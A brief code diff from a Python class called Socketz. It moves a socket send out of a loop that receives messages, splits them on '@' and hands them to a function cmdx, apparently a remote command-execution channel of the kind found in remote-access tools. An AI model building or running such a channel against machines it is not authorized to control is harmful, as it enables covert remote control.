@@ -179,8 +179,8 @@ class Socketz():
 
 
 	def long_tcp(self):
+		self.sock.send("intotcplong".encode("utf-8"))
 		while True:
-			self.sock.send("intotcplong".encode("utf-8"))
 			cmd = self.sock.recv(1024).decode("utf-8")
 			cmd = cmd.split("@")
 			data = cmdx(cmd)
